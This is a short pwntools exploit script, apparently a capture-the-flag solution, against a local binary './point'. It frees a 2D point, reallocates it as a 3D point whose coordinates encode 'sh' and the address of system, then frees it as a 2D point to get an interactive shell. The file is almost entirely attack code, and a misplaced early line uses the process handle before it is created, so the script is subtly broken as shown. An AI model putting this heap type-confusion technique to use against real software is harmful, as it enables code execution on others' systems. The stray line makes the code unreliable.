from pwn import *
p.recvuntil(b'Exit\n')

BIN = './point'
p = process(BIN)
elf = ELF(BIN)

sh = u32(b'sh\x00\x00')
system = elf.plt['system']

# Allocate 2D point.
p.recvuntil(b'Exit\n')
p.sendline(b'1')
p.sendline(b'0 0')
p.sendline(b'0')  # id

# Deallocate the 2D point above.
p.recvuntil(b'Exit\n')
p.sendline(b'2')
p.sendline(b'0')  # id

# Allocate malicious 3D point.
p.recvuntil(b'Exit\n')
p.sendline(b'4')
coords = (str(sh) + ' 0 ' + str(system)).encode()
p.sendline(coords)
p.sendline(b'0')  # id

# Deallocate the 3D above point *as a 2D point*.
p.recvuntil(b'Exit\n')
p.sendline(b'3')
p.sendline(b'0')  # id

p.interactive()
